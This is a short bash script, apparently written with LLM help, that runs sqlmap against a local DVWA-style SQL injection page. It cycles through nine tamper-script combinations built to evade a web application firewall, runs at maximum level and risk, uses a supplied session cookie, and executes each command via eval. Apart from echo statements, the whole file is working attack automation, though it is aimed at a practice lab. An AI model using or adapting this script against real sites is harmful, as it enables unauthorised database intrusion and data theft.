#!/bin/bash
#
# Script was created with the guidance of Gemini LLM: https://gemini.google.com/
#
PORT="$2"
TARGET_URL="http://localhost:$PORT/vulnerabilities/sqli/?id=1&Submit=Submit#"

if [ -z "$1" ]; then
    echo "ERROR: Missing PHPSESSID value."
    echo "Usage: $0 <PHPSESSID_VALUE>"
    echo "Example: $0 m7m999r1ts7u0a21e61kr3oo91"
    exit 1
fi

PHPSESSID_VALUE="$1"
AUTH_COOKIE="PHPSESSID=${PHPSESSID_VALUE}; security=low"

TAMPER_SCRIPTS=(
    "space2comment,charencode"
    "space2mysqlblank,charencode"
    "randomcase,space2comment"

    "charencode,apostrophemask"
    "randomcase,unmagicquotes"
    "percentage"

    "modsecurityversioned"
    "versionedkeywords"
    "multiplespaces,randomcase"
)

SQLMAP_BASE_COMMAND="sqlmap -u \"${TARGET_URL}\" --cookie=\"${AUTH_COOKIE}\" -p id --threads=1 --batch --skip-waf --level=5 --risk=3 --flush-session --dbms=mysql"

echo "Starting SQLMap WAF Evasion Test Cycle"
echo "Target URL: ${TARGET_URL}"
echo "Auth Cookie (Constructed): ${AUTH_COOKIE}"
echo "Total Tests: ${#TAMPER_SCRIPTS[@]}"

TEST_COUNT=0
for TAMPER_SET in "${TAMPER_SCRIPTS[@]}"; do
    TEST_COUNT=$((TEST_COUNT + 1))
    
    echo -e "\n--- TEST ${TEST_COUNT}/${#TAMPER_SCRIPTS[@]}: Tamper Flags -> ${TAMPER_SET} ---"
    
    FULL_COMMAND="${SQLMAP_BASE_COMMAND} --tamper='${TAMPER_SET}'"
    
    echo -e "Executing: ${FULL_COMMAND}"
    
    eval "$FULL_COMMAND"

    sleep 2
done

echo "All automated WAF evasion tests complete."
